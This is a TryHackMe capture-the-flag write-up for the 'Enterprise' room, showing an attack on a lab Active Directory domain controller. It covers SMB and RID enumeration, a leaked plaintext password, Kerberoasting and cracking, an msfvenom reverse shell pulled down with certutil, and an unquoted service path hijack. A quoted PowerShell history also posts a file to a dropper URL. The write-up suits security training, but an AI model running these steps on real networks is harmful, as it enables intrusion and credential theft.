<h1 align="center">Enterprise</h1>
<p align="center">2025, October 20  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>532</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>You just landed in an internal network. You scan the network and there's only the Domain Controller... &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/enterprise">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/f80ad0bd-4c1a-41e6-8179-4a8077488803"></p>



<h2>Task 1 . Get Connected!</h2>
<h3>Accessing Enterprise</h3>
<p>To access the Virtual Machine, you will need to first connect to our network using OpenVPN. Here is a mini walkthrough of getting connected.</p>
<h6><em>(Please note the browser-based machine will be able to access this machine, you will not need to connect to the VPN.)</em></h6>

<p><em>Answer the questions below</em></p>

<p>1.1. access<br>
<code>No answer needed</code></p>

<p>1.2. <br>
<code>No answer needed</code></p>

<p>1.3. Return to your access page. You can verify you are connected by looking on your access page. Refresh the page. You should see a green tick next to Connected. It will also show you your internal IP address. You're now ready to start hacking! <br>
<code>No answer needed</code></p>

<p>1.4. Alternatively, you can deploy the In-Browser Kali or Attack Box and automatically be connected to the TryHackMe Network.<br>
<code>No answer needed</code></p>

<p>1.5. Once connected to the VPN, deploy the machine and get hacking!<br>
<code>No answer needed</code></p>

<h2>Task 2 . Flag Submission Panel</h2>
<h3>Flag Submission Panel</h3>
<p>Use this task to submit the User and Root flags gained after compromising the Domain Controller.<br>Did you like the room? Let me know on Twitter!</p>

<p><em>Answer the questions below</em></p>


```bash
:~# nmap xx.xx.xxx.xxx
...
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
```

```bash
:~# nmap -sC -sV -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5357 -T4 xx.xx.xxx.xxx
...
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-20 xx:xx:xxZ)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-20Txx:xx:xx+00:00
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2025-10-19Txx:xx:xx:47
|_Not valid after:  2026-04-20Txx:xx:xx:47
|_ssl-date: 2025-10-20T23:06:49+00:00; -1s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
```

```bash
:~# ping LAB.ENTERPRISE.THM
PING LAB.ENTERPRISE.THM (xx.xx.xxx.xxx) 56(84) bytes of data.
64 bytes from LAB.ENTERPRISE.THM (xx.xx.xxx.xxx): icmp_seq=1 ttl=128 time=0.609 ms
64 bytes from LAB.ENTERPRISE.THM (xx.xx.xxx.xxx): icmp_seq=2 ttl=128 time=0.963 ms
64 bytes from LAB.ENTERPRISE.THM (xx.xx.xxx.xxx): icmp_seq=3 ttl=128 time=1.20 ms
64 bytes from LAB.ENTERPRISE.THM (xx.xx.xxx.xxx): icmp_seq=4 ttl=128 time=0.956 ms
```

```bash
:~# ping LAB-DC.LAB.ENTERPRISE.THM
PING LAB.ENTERPRISE.THM (xx.xx.xxx.xxx) 56(84) bytes of data.
64 bytes from LAB.ENTERPRISE.THM (xx.xx.xxx.xxx): icmp_seq=1 ttl=128 time=0.805 ms
64 bytes from LAB.ENTERPRISE.THM (xx.xx.xxx.xxx): icmp_seq=2 ttl=128 time=0.934 ms
64 bytes from LAB.ENTERPRISE.THM (xx.xx.xxx.xxx): icmp_seq=3 ttl=128 time=0.939 ms
```

```bash
xx.xx.xxx.xxx  LAB.ENTERPRISE.THM LAB-ENTERPRISE  LAB-DC.LAB.ENTERPRISE.THM
```

```bash
:~# smbclient -L LAB.ENTERPRISE.THM -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Docs            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      Users Sh
```

```bash
:~# nxc smb lab.enterprise.thm -u 'guest' -p ''
SMB         xx.xx.xxx.xxx   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         xx.xx.xxx.xxx   445    LAB-DC           [+] LAB.ENTERPRISE.THM\guest: 
```

```bash
:~# nxc smb lab.enterprise.thm -u 'guest' -p '' --shares
SMB         xx.xx.xxx.xxx   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         xx.xx.xxx.xxx   445    LAB-DC           [+] LAB.ENTERPRISE.THM\guest: 
SMB         xx.xx.xxx.xxx   445    LAB-DC           [*] Enumerated shares
SMB         xx.xx.xxx.xxx   445    LAB-DC           Share           Permissions     Remark
SMB         xx.xx.xxx.xxx   445    LAB-DC           -----           -----------     ------
SMB         xx.xx.xxx.xxx   445    LAB-DC           ADMIN$                          Remote Admin
SMB         xx.xx.xxx.xxx   445    LAB-DC           C$                              Default share
SMB         xx.xx.xxx.xxx   445    LAB-DC           Docs            READ            
SMB         xx.xx.xxx.xxx   445    LAB-DC           IPC$            READ            Remote IPC
SMB         xx.xx.xxx.xxx   445    LAB-DC           NETLOGON                        Logon server share 
SMB         xx.xx.xxx.xxx   445    LAB-DC           SYSVOL                          Logon server share 
SMB         xx.xx.xxx.xxx   445    LAB-DC           Users           READ            Users Share. Do Not Touch!
```

```bash
:~# nxc smb lab.enterprise.thm -u 'guest' -p '' --rid
SMB         xx.xx.xxx.xxx   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         xx.xx.xxx.xxx   445    LAB-DC           [+] LAB.ENTERPRISE.THM\guest: 
SMB         xx.xx.xxx.xxx   445    LAB-DC           500: LAB-ENTERPRISE\Administrator (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           501: LAB-ENTERPRISE\Guest (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           512: LAB-ENTERPRISE\Domain Admins (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           513: LAB-ENTERPRISE\Domain Users (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           514: LAB-ENTERPRISE\Domain Guests (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           515: LAB-ENTERPRISE\Domain Computers (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           516: LAB-ENTERPRISE\Domain Controllers (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           517: LAB-ENTERPRISE\Cert Publishers (SidTypeAlias)
SMB         xx.xx.xxx.xxx   445    LAB-DC           520: LAB-ENTERPRISE\Group Policy Creator Owners (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           521: LAB-ENTERPRISE\Read-only Domain Controllers (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           522: LAB-ENTERPRISE\Cloneable Domain Controllers (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           525: LAB-ENTERPRISE\Protected Users (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           526: LAB-ENTERPRISE\Key Admins (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           553: LAB-ENTERPRISE\RAS and IAS Servers (SidTypeAlias)
SMB         xx.xx.xxx.xxx   445    LAB-DC           571: LAB-ENTERPRISE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         xx.xx.xxx.xxx   445    LAB-DC           572: LAB-ENTERPRISE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1102: LAB-ENTERPRISE\DnsAdmins (SidTypeAlias)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1103: LAB-ENTERPRISE\DnsUpdateProxy (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1107: LAB-ENTERPRISE\nik (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1108: LAB-ENTERPRISE\replication (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1109: LAB-ENTERPRISE\spooks (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1110: LAB-ENTERPRISE\korone (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1111: LAB-ENTERPRISE\banana (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1112: LAB-ENTERPRISE\Cake (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1113: LAB-ENTERPRISE\Password-Policy-Exemption (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1114: LAB-ENTERPRISE\Contractor (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1115: LAB-ENTERPRISE\sensitive-account (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1117: LAB-ENTERPRISE\varg (SidTypeUser)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1118: LAB-ENTERPRISE\adobe-subscription (SidTypeGroup)
SMB         xx.xx.xxx.xxx   445    LAB-DC           1119: LAB-ENTERPRISE\joiner (SidTypeUser)
```

```bash
:~# lookupsid.py anonymous@LAB.ENTERPRISE.THM | tee exmployees.txt
Password:
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Brute forcing SIDs at LAB.ENTERPRISE.THM
[*] StringBinding ncacn_np:LAB.ENTERPRISE.THM[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2168718921-3906202695-65158103
500: LAB-ENTERPRISE\Administrator (SidTypeUser)
501: LAB-ENTERPRISE\Guest (SidTypeUser)
502: LAB-ENTERPRISE\krbtgt (SidTypeUser)
512: LAB-ENTERPRISE\Domain Admins (SidTypeGroup)
513: LAB-ENTERPRISE\Domain Users (SidTypeGroup)
514: LAB-ENTERPRISE\Domain Guests (SidTypeGroup)
515: LAB-ENTERPRISE\Domain Computers (SidTypeGroup)
516: LAB-ENTERPRISE\Domain Controllers (SidTypeGroup)
517: LAB-ENTERPRISE\Cert Publishers (SidTypeAlias)
520: LAB-ENTERPRISE\Group Policy Creator Owners (SidTypeGroup)
521: LAB-ENTERPRISE\Read-only Domain Controllers (SidTypeGroup)
522: LAB-ENTERPRISE\Cloneable Domain Controllers (SidTypeGroup)
525: LAB-ENTERPRISE\Protected Users (SidTypeGroup)
526: LAB-ENTERPRISE\Key Admins (SidTypeGroup)
553: LAB-ENTERPRISE\RAS and IAS Servers (SidTypeAlias)
571: LAB-ENTERPRISE\Allowed RODC Password Replication Group (SidTypeAlias)
572: LAB-ENTERPRISE\Denied RODC Password Replication Group (SidTypeAlias)
1000: LAB-ENTERPRISE\atlbitbucket (SidTypeUser)
1001: LAB-ENTERPRISE\LAB-DC$ (SidTypeUser)
1102: LAB-ENTERPRISE\DnsAdmins (SidTypeAlias)
1103: LAB-ENTERPRISE\DnsUpdateProxy (SidTypeGroup)
1104: LAB-ENTERPRISE\ENTERPRISE$ (SidTypeUser)
1106: LAB-ENTERPRISE\bitbucket (SidTypeUser)
1107: LAB-ENTERPRISE\nik (SidTypeUser)
1108: LAB-ENTERPRISE\replication (SidTypeUser)
1109: LAB-ENTERPRISE\spooks (SidTypeUser)
1110: LAB-ENTERPRISE\korone (SidTypeUser)
1111: LAB-ENTERPRISE\banana (SidTypeUser)
1112: LAB-ENTERPRISE\Cake (SidTypeUser)
1113: LAB-ENTERPRISE\Password-Policy-Exemption (SidTypeGroup)
1114: LAB-ENTERPRISE\Contractor (SidTypeGroup)
1115: LAB-ENTERPRISE\sensitive-account (SidTypeGroup)
1116: LAB-ENTERPRISE\contractor-temp (SidTypeUser)
1117: LAB-ENTERPRISE\varg (SidTypeUser)
1118: LAB-ENTERPRISE\adobe-subscription (SidTypeGroup)
1119: LAB-ENTERPRISE\joiner (SidTypeUser)
```

```bash
:~# cat exmployees.txt | grep SidTypeUser |gawk -F '\' '{ print $2 }' |gawk -F ' ' '{print $1}' | tee employeesnames.txt
Administrator
Guest
krbtgt
atlbitbucket
LAB-DC$
ENTERPRISE$
bitbucket
nik
replication
spooks
korone
banana
Cake
contractor-temp
varg
joiner
```

```bash
:~# smbclient //LAB.ENTERPRISE.THM/Docs -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 15 02:47:35 2021
  ..                                  D        0  Mon Mar 15 02:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 02:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 02:45:24 2021

		15587583 blocks of size 4096. 9924971 blocks available
smb: \> get RSA-Secured-Credentials.xlsx
getting file \RSA-Secured-Credentials.xlsx of size 15360 as RSA-Secured-Credentials.xlsx (517.2 KiloBytes/sec) (average 517.2 KiloBytes/sec)
smb: \> get RSA-Secured-Document-PII.docx
getting file \RSA-Secured-Document-PII.docx of size 18432 as RSA-Secured-Document-PII.docx (580.6 KiloBytes/sec) (average 550.0 KiloBytes/sec)
```

```bash
:~# file RSA-Secured-Credentials.xlsx
RSA-Secured-Credentials.xlsx: CDFV2 Encrypted
```

```bash
:~# file RSA-Secured-Document-PII.docx
RSA-Secured-Document-PII.docx: CDFV2 Encrypted
```

```bash
:~# smbclient //LAB.ENTERPRISE.THM/Users -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Mar 12 02:11:49 2021
  ..                                 DR        0  Fri Mar 12 02:11:49 2021
  Administrator                       D        0  Thu Mar 11 21:55:48 2021
  All Users                       DHSrn        0  Sat Sep 15 08:28:48 2018
  atlbitbucket                        D        0  Thu Mar 11 22:53:06 2021
  bitbucket                           D        0  Fri Mar 12 02:11:51 2021
  Default                           DHR        0  Fri Mar 12 00:18:03 2021
  Default User                    DHSrn        0  Sat Sep 15 08:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 08:16:48 2018
  LAB-ADMIN                           D        0  Fri Mar 12 00:28:14 2021
  Public                             DR        0  Thu Mar 11 21:27:02 2021

		15587583 blocks of size 4096. 9930667 blocks available


smb: \> get desktop.ini
getting file \desktop.ini of size 174 as desktop.ini (34.0 KiloBytes/sec) (average 34.0 KiloBytes/sec)
```

```bash
:~# cat desktop.ini
\ufffd\ufffd
[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
```

```bash
...
smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\> get Consolehost_hisory.txt
getting file \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\Consolehost_hisory.txt of size 424 as Consolehost_hisory.txt (82.8 KiloBytes/sec) (average 82.8 KiloBytes/sec)
```

```bash
:~# file Consolehost_hisory.txt
Consolehost_hisory.txt: ASCII text, with CRLF line terminators
```

```bash
:~# cat Consolehost_hisory.txt
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo "replication:****************">private.txt
Invoke-WebRequest -Uri http://x.xxx.xx.xx/payment-details.txt
more payment-details.txt
curl -X POST -H 'Cotent-Type: ascii/text' -d .\private.txt' http://x.xxx.xx.xx/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
```

```bash
Reminder to all Enterprise-THM Employees:
We are moving to Github!

Log in to your account
```

<img width="1126" height="485" alt="image" src="https://github.com/user-attachments/assets/f0adcaa4-c1b9-4a1d-b228-6b1133629413" />

<img width="944" height="337" alt="image" src="https://github.com/user-attachments/assets/db0f1a53-893d-4de6-ba30-0642404447d0" />

<img width="1099" height="552" alt="image" src="https://github.com/user-attachments/assets/0398b5e9-75ea-408d-a22b-01bd58ea20c0" />

<img width="1119" height="332" alt="image" src="https://github.com/user-attachments/assets/63ac76af-6c70-4c10-aa91-baffa3018d67" />

<img width="1113" height="596" alt="image" src="https://github.com/user-attachments/assets/fa48a0eb-9764-462e-a9ff-d718b128cb2d" />

<img width="1117" height="521" alt="image" src="https://github.com/user-attachments/assets/1646ca00-7aa1-46b8-b601-b302676f68d3" />

```bash
Import-Module ActiveDirectory
$userName = ''
$userPassword = ''
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }
```

<img width="1124" height="710" alt="image" src="https://github.com/user-attachments/assets/6cb80095-70b4-49f7-a6d4-b21c30b644ab" />

```bash
Import-Module ActiveDirectory
$userName = 'nik'
$userPassword = 'ToastyBoi!'
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }
```

```bash
:~# rpcclient -U nik LAB.ENTERPRISE.THM
Password for [WORKGROUP\nik]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[atlbitbucket] rid:[0x3e8]
user:[bitbucket] rid:[0x452]
user:[nik] rid:[0x453]
user:[replication] rid:[0x454]
user:[spooks] rid:[0x455]
user:[korone] rid:[0x456]
user:[banana] rid:[0x457]
user:[Cake] rid:[0x458]
user:[contractor-temp] rid:[0x45c]
user:[varg] rid:[0x45d]
user:[joiner] rid:[0x45f]
```

```bash
:~# python3.9 /opt/impacket/build/scripts-3.9/GetUserSPNs.py LAB.ENTERPRISE.THM/nik:ToastyBoi! -dc-ip xx.xx.xxx.xxx -request
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 01:20:01.333272  2021-04-26 16:16:41.570158             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$0f...
```

```bash
:~# john --wordlist=/usr/share/wordlists/rockyou.txt Hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
***************  (?)
1g 0:00:00:02 DONE (2025-10-20 xx:xx) 0.3412g/s 535939p/s 535939c/s 535939C/s livelife92..littled8
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<img width="910" height="123" alt="image" src="https://github.com/user-attachments/assets/c36d67d9-3fe3-4fbf-8242-8a4371544b50" />

```bash
:~# xfreerdp /v:LAB.ENTERPRISE.THM /u:bitbucket /p:*************** /dynamic-resolution
```

<img width="984" height="249" alt="image" src="https://github.com/user-attachments/assets/d47a3694-5dc4-4245-ab4c-fed1c54247fa" />

<img width="961" height="628" alt="image" src="https://github.com/user-attachments/assets/596a2855-109d-45de-9f7d-16d3041a05d5" />

<img width="1086" height="623" alt="image" src="https://github.com/user-attachments/assets/45c503fa-a881-4cfc-86aa-a62f4d2a61fc" />

```bash
:~/Enterprise# ls
winPEASany.exe
```

```bash
:~/Enterprise# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<img width="1344" height="535" alt="image" src="https://github.com/user-attachments/assets/ec344ee0-e339-4a98-b9b5-74e5fb7f13cb" />

<img width="1386" height="541" alt="image" src="https://github.com/user-attachments/assets/ddc4cda0-975b-456f-ac6b-1a098a44d740" />

```bash
zerotieroneservice(zerotieroneservice)[[0m[1;31mC:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe[0m] - Auto - Stopped - [0m[1;31mNo quotes and Space detected[0m
    [0m[1;31mFile Permissions: Users [WriteData/CreateFiles][0m
    [0m[1;31mPossible DLL Hijacking in binary folder: C:\Program Files (x86)\Zero Tier\Zero Tier One (Users [WriteData/CreateFiles])[0m
```

<img width="1147" height="334" alt="image" src="https://github.com/user-attachments/assets/f9f71d08-665c-4222-9d6f-feb3089dd5d4" />

```bash
PS C:\Users\bitbucket> icacls "C:\Program Files (x86)\Zero Tier\Zero Tier One"
```

<img width="1359" height="405" alt="image" src="https://github.com/user-attachments/assets/3e1f4966-04f9-4292-b662-d75f44211884" />

```bash
PS C:\Program Files (x86)\Zero Tier> Get-Service zerotieroneservice

Status   Name               DisplayName
------   ----               -----------
Stopped  zerotieroneservice zerotieroneservice
```

```bash
:~/Enterprise# msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xxx.xxx LPORT=443 -f exe -o Zero.exe
```

<img width="1059" height="146" alt="image" src="https://github.com/user-attachments/assets/d2781b4d-e611-4ab8-8fe9-5d6468e91702" />

```bash
:~/Enterprise# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<img width="998" height="163" alt="image" src="https://github.com/user-attachments/assets/58beb2a9-081a-41b7-91d2-831266b026cb" />

```bash
PS C:\Program Files (x86)\Zero Tier> certutil.exe -urlcache -split -f "http://xx.xx.xxx.xxx:8000/Zero.exe" Zero.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
```

```bash
PS C:\Program Files (x86)\Zero Tier> dir


    Directory: C:\Program Files (x86)\Zero Tier


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/14/2021   6:08 PM                Zero Tier One
-a----       10/20/2025   x:xx PM          73802 Zero.exe
```

```bash
PS C:\Program Files (x86)\Zero Tier> Start-Service zerotieroneservice
```

<img width="992" height="187" alt="image" src="https://github.com/user-attachments/assets/c7e5dff4-27b9-4e12-938b-6c20f0384cdb" />

<img width="987" height="286" alt="image" src="https://github.com/user-attachments/assets/1af2fe39-396d-4792-9c26-cde2dd8141ff" />

<p>2.1. What is the contents of User.txt<br>
<code>THM{********************************}</code></p>

<p>2.2. What is the contents of Root.txt<br>
<code>THM{********************************}</code></p>

<br>
<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/7277784e-209a-4240-bfc1-6679b4aee36f"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/f7012c61-8be8-4df5-afef-238c2d183771"></p>


<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>


<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|20      |Hard 🚩 - Enterprise                   | 532    |      87ᵗʰ    |      4ᵗʰ     |      81ˢᵗ    |     2ⁿᵈ    | 131,729  |  1,010    |    79     |
|19      |Hard 🚩 - Misguided Ghosts             | 531    |      87ᵗʰ    |      4ᵗʰ     |      77ᵗʰ    |     2ⁿᵈ    | 131,661  |  1,009    |    79     |
|18      |Hard 🚩 - Year of the Pig              | 530    |      89ᵗʰ    |      4ᵗʰ     |      72ⁿᵈ    |     2ⁿᵈ    | 131,531  |  1,008    |    79     |
|18      |Easy 🚩 - The Phishing Pond            | 530    |      90ᵗʰ    |      4ᵗʰ     |      74ᵗʰ    |     2ⁿᵈ    | 131,501  |  1,007    |    79     |
|17      |Hard 🚩 - Initial Access Pot           | 529    |      90ᵗʰ    |      4ᵗʰ     |      68ᵗʰ    |     2ⁿᵈ    | 131,456  |  1,006    |    79     |
|17      |Medium 🔗 - AllSignsPoint2Pwnage       | 529    |      90ᵗʰ    |      4ᵗʰ     |      87ᵗʰ    |     2ⁿᵈ    | 131,186  |  1,005    |    79     |
|16      |Easy 🔗 - Network Traffic Basics       | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,138  |  1,004    |    79     |
|16      |Medium 🔗 - Linux Threat Detection 3   | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,066  |  1,003    |    79     |
|15      |Medium 🔗 - Windows PrivEsc, in progress| 527   |      91ˢᵗ    |      4ᵗʰ     |      83ʳᵈ    |     2ⁿᵈ    | 131,050  |  1,002    |    79     |
|13      |Hard 🚩 - M4tr1x: Exit Denied          | 525    |      92ⁿᵈ    |      4ᵗʰ     |      76ᵗʰ    |     2ⁿᵈ    | 130,938  |  1,002    |    79     |
|12      |Easy 🔗 - Atlas                        | 524    |     101ˢᵗ    |      4ᵗʰ     |     251ˢᵗ    |     3ʳᵈ    | 129,902  |  1,001    |    76     |
|11      |Easy 🔗 - Brute Force Heroes           | 523    |     101ˢᵗ    |      4ᵗʰ     |     217ᵗʰ    |     3ʳᵈ    | 129,878  |  1,000    |    76     |
|11      |Hard 🚩 - Rocket                       | 523    |     102ⁿᵈ    |      4ᵗʰ     |     211ˢᵗ    |     3ʳᵈ    | 129,870  |    999    |    76     |
|10      |Easy 🚩 - Shadow Trace                 | 522    |     101ˢᵗ    |      4ᵗʰ     |     159ᵗʰ    |     3ʳᵈ    | 129,810  |    998    |    76     |
|10      |Easy 🔗 - Defensive Security Intro     | 522    |     103ʳᵈ    |      4ᵗʰ     |     357ᵗʰ    |     3ʳᵈ    | 129,405  |    997    |    76     |
|10      |Easy 🔗 - 25 Days of Cyber Security, Day 2| 522|      103ʳᵈ    |      4ᵗʰ     |     355ᵗʰ    |     3ʳᵈ    | 129,405  |    996    |    76     |
|9       |Medium 🔗 - Linux Threat Detection 2   | 521    |     103ʳᵈ    |      4ᵗʰ     |     326ᵗʰ    |     3ʳᵈ    | 129,373  |    996    |    76     |
|9       |Medium 🚩 - WWBuddy                    | 521    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,293  |    995    |    76     |
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
